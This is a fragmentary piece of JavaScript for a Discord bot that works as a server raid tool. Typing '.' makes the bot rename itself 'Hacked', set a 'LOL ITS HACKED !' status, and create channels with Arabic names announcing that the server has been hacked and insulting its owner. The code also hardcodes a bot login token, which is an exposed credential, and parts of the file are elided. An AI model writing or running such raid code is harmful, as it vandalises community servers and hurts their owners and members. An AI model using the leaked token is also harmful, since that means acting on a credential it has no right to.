...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked Im_A7mad_XD الونرالجديد خرى")
 
}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`LOL ITS HACKED !`,'https://www.twitch.tv/hix')
...
await guild.createChannel('تم تهكير السيرفر الاونر الجديد خرى', 'text');
 
      await guild.createChannel('تم تهكير السيرفر الاونر الجديد خرى', 'voice');
...
LOka.login("NDczNTM3NjM5NTYwMTE4Mjky.DkEhzA.I46ZTyln58y93iKFIh7GI5fU8wE")
